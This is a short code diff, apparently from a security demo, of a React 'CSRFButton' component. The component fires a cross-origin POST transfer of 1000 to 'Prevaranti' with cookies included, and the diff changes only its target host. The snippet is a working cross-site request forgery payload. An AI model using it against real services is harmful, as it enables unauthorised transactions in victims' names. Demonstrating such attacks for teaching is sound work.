@@ -5,7 +5,7 @@ const CSRFButton = () => {
     const body = new URLSearchParams(
       "amount=1000&to=Prevaranti"
     );
-    fetch("https://vulnerablebackend.onrender.com/transfer", {
+    fetch("https://bankingserver.onrender.com/transfer", {
       body,
       credentials: "include", // include cookies, despite being a cross-origin request
       method: "post",
